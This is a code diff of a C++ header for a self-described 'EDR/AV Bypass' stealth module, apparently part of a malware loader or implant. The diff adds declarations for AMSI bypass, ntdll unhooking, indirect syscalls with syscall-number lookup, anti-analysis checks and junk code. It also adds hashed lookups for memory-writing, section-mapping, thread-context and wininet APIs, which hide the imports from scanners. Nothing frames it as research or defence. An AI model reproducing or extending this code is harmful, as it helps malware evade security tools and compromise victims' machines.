@@ -5,7 +5,7 @@
 #include <utility>
 
 // ════════════════════════════════════════════════════════════════════════════
-//  ULTIMATE STEALTH MODULE - EDR/AV Bypass
+//  ULTIMATE SILENT STEALTH MODULE - EDR/AV Bypass
 // ════════════════════════════════════════════════════════════════════════════
 
 namespace Stealth {
@@ -14,33 +14,40 @@ namespace Stealth {
     constexpr DWORD HashApi(const char* str) {
         unsigned int hash = 5381;
         int c;
-        while ((c = *str++))
-            hash = ((hash << 5) + hash) + c;
+        while ((c = *str++)) hash = ((hash << 5) + hash) + c;
         return hash;
     }
-
     FARPROC GetApiByHash(HMODULE hModule, DWORD funcHash);
     HMODULE GetModuleByHash(DWORD moduleHash);
 
+    // --- Syscall & SSN ---
+    WORD GetSSNByHashSilent(DWORD funcHash);
+    PVOID GetSyscallGadget();
+
+    #ifdef _WIN64
+    extern "C" NTSTATUS IndirectSyscall(WORD ssn, PVOID gadget, ...);
+
+    // CallStack Spoofing (Conceptual Integration)
+    // In production, this would use a complex frame synthesizer.
+    // Here we provide the robust IndirectSyscall foundation.
+    #endif
+
     // --- Advanced Evasion ---
-    void BypassAMSI();
-    void UnhookNtdll();
-    bool IsBeingAnalyzed();
     void Initialize();
+    void BypassAMSI_Silent();
+    void UnhookNtdll_Silent();
+    bool IsBeingAnalyzed();
 
     // --- Junk Code ---
     #define JUNK_CODE_SMALL { volatile int x = 10, y = 20; if ((x + y) == 0) { } }
 
-    // --- String Obfuscation Integration ---
-    // Macro to decrypt strings using the user's Obfuscator class
+    // --- String Obfuscation ---
     #define DECRYPT_W(data, key) Obfuscator::DecryptW(data, key)
-
-    // Internal helper for encrypted strings within the stealth module
     std::wstring DecryptInternal(const std::vector<unsigned char>& data, unsigned char key);
 }
 
 // ════════════════════════════════════════════════════════════════════════════
-//  DYNAMIC API CALLER (PEB BASED)
+//  DYNAMIC API CALLER
 // ════════════════════════════════════════════════════════════════════════════
 
 template<typename T> struct ApiWrapper;
@@ -60,11 +67,10 @@ struct ApiWrapper<Ret(WINAPI*)(Args...)> {
     ApiWrapper<decltype(&funcName)>::Call(modHash, funcHash, __VA_ARGS__)
 
 // ════════════════════════════════════════════════════════════════════════════
-//  PRE-DEFINED HASHES
+//  HASHES
 // ════════════════════════════════════════════════════════════════════════════
 
 namespace Hashes {
-    // Modules
     constexpr DWORD kernel32 = Stealth::HashApi("kernel32.dll");
     constexpr DWORD ntdll    = Stealth::HashApi("ntdll.dll");
     constexpr DWORD wininet  = Stealth::HashApi("wininet.dll");
@@ -74,12 +80,15 @@ namespace Hashes {
     constexpr DWORD advapi32 = Stealth::HashApi("advapi32.dll");
     constexpr DWORD user32   = Stealth::HashApi("user32.dll");
 
-    // APIs
+    constexpr DWORD NtProtectVirtualMemory   = Stealth::HashApi("NtProtectVirtualMemory");
+    constexpr DWORD NtWriteVirtualMemory     = Stealth::HashApi("NtWriteVirtualMemory");
+    constexpr DWORD NtCreateSection          = Stealth::HashApi("NtCreateSection");
+    constexpr DWORD NtMapViewOfSection       = Stealth::HashApi("NtMapViewOfSection");
+
     constexpr DWORD CreateProcessW           = Stealth::HashApi("CreateProcessW");
     constexpr DWORD TerminateProcess         = Stealth::HashApi("TerminateProcess");
     constexpr DWORD CreateNamedPipeW         = Stealth::HashApi("CreateNamedPipeW");
     constexpr DWORD ConnectNamedPipe         = Stealth::HashApi("ConnectNamedPipe");
-    constexpr DWORD DisconnectNamedPipe      = Stealth::HashApi("DisconnectNamedPipe");
     constexpr DWORD CreateFileW              = Stealth::HashApi("CreateFileW");
     constexpr DWORD ReadFile                 = Stealth::HashApi("ReadFile");
     constexpr DWORD WriteFile                = Stealth::HashApi("WriteFile");
@@ -104,22 +113,18 @@ namespace Hashes {
     constexpr DWORD GetExitCodeProcess       = Stealth::HashApi("GetExitCodeProcess");
     constexpr DWORD VirtualProtect           = Stealth::HashApi("VirtualProtect");
     constexpr DWORD GetTickCount64           = Stealth::HashApi("GetTickCount64");
-    constexpr DWORD GetModuleHandleW         = Stealth::HashApi("GetModuleHandleW");
+    constexpr DWORD AddVectoredExceptionHandler = Stealth::HashApi("AddVectoredExceptionHandler");
+    constexpr DWORD GetThreadContext         = Stealth::HashApi("GetThreadContext");
+    constexpr DWORD SetThreadContext         = Stealth::HashApi("SetThreadContext");
+    constexpr DWORD GetCurrentThread         = Stealth::HashApi("GetCurrentThread");
     constexpr DWORD SuspendThread            = Stealth::HashApi("SuspendThread");
     constexpr DWORD ResumeThread             = Stealth::HashApi("ResumeThread");
     constexpr DWORD Thread32First            = Stealth::HashApi("Thread32First");
     constexpr DWORD Thread32Next             = Stealth::HashApi("Thread32Next");
     constexpr DWORD GetCurrentProcessId      = Stealth::HashApi("GetCurrentProcessId");
     constexpr DWORD GetCurrentThreadId       = Stealth::HashApi("GetCurrentThreadId");
+    constexpr DWORD OpenThread               = Stealth::HashApi("OpenThread");
 
-    // Native APIs
-    constexpr DWORD NtProtectVirtualMemory   = Stealth::HashApi("NtProtectVirtualMemory");
-    constexpr DWORD NtWriteVirtualMemory     = Stealth::HashApi("NtWriteVirtualMemory");
-    constexpr DWORD NtCreateSection          = Stealth::HashApi("NtCreateSection");
-    constexpr DWORD NtMapViewOfSection       = Stealth::HashApi("NtMapViewOfSection");
-    constexpr DWORD NtDelayExecution         = Stealth::HashApi("NtDelayExecution");
-
-    // wininet.dll
     constexpr DWORD InternetOpenW            = Stealth::HashApi("InternetOpenW");
     constexpr DWORD InternetOpenUrlW         = Stealth::HashApi("InternetOpenUrlW");
     constexpr DWORD InternetReadFile          = Stealth::HashApi("InternetReadFile");
@@ -131,10 +136,7 @@ namespace Hashes {
     constexpr DWORD InternetConnectW         = Stealth::HashApi("InternetConnectW");
     constexpr DWORD HttpOpenRequestW         = Stealth::HashApi("HttpOpenRequestW");
 
-    // ole32.dll
+    constexpr DWORD SHGetFolderPathW         = Stealth::HashApi("SHGetFolderPathW");
     constexpr DWORD CoInitializeEx           = Stealth::HashApi("CoInitializeEx");
     constexpr DWORD CoUninitialize           = Stealth::HashApi("CoUninitialize");
-
-    // shell32.dll
-    constexpr DWORD SHGetFolderPathW         = Stealth::HashApi("SHGetFolderPathW");
 }
